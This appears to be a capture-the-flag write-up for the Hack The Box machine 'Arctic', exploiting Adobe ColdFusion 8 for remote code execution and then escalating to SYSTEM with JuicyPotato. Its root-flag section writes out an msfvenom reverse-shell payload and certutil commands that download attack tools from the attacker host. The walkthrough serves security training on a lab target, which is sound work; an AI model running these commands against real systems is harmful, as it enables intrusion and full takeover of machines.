## Arctic

Difficulty: Easy

### User Flag

```
rustscan -a 10.10.10.11 --ulimit 5000 -- -A -sV -sC
```

![rustscan](https://user-images.githubusercontent.com/58514930/224725901-10ff4e4f-03a3-4022-bec9-be6a9f5bd384.png)

<br>

There are some directory listing on port 8500.

![port8500](https://user-images.githubusercontent.com/58514930/224726492-0ad137be-743c-43d4-aced-920413a8e110.png)

<br>

Inside /CFIDE/Adminstrator there is Adobe Coldfusion 8.

![coldfusion](https://user-images.githubusercontent.com/58514930/224726598-69ce4972-1e9e-467d-ba48-f3b218384f87.png)

<br>

Searching for vulnerabilities, we found [this RCE exploit](https://www.exploit-db.com/exploits/50057
).

Edit the IPs and ports and execute it to get the user flag.

![editingExploit](https://user-images.githubusercontent.com/58514930/224727016-0812c624-3b60-437f-aeca-71ceac5b9c26.png)

![usingExploit](https://user-images.githubusercontent.com/58514930/224727078-e1988dd4-2bf4-4ea9-8da0-af6379ed2340.png)

### Root Flag

Enumerating the machine, we discover that our user has SeImpersonatePrivilege.

```
whoami /priv
```

![enumeratingPrivs](https://user-images.githubusercontent.com/58514930/224727453-c908c8d6-c289-4fc5-9ec2-93567f125a66.png)

<br>

We can use JuicyPotato to exploit this following [this guide](https://juggernaut-sec.com/seimpersonateprivilege/).

``` bash
# Just checking the S.O. version
systeminfo | findstr /B /C:"Host Name" /C:"OS Name" /C:"OS Version" /C:"System Type" /C:"Hotfix(s)"
Microsoft Windows Server 2008 R2 Standard

# Generating the executable that will be executed by nt system.
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.2 LPORT=80 -a x64 --platform Windows -f exe -o shell.exe

# Getting JuicyPotato and the shell on the victim machine.
certutil -urlcache -split -f "http://10.10.14.2:8000/JuicyPotato.exe" JuicyPotato.exe
certutil -urlcache -split -f "http://10.10.14.2:8000/shell.exe" shell.exe

# Exploiting
JuicyPotato.exe -t * -p shell.exe -l 443
```

![usingJuicy](https://user-images.githubusercontent.com/58514930/224728154-d6f430a6-f73c-4770-8fc8-1a02b6d8087d.png)

![gettingRoot](https://user-images.githubusercontent.com/58514930/224728134-06e55191-51ac-4a20-8c8f-c6312434936d.png)
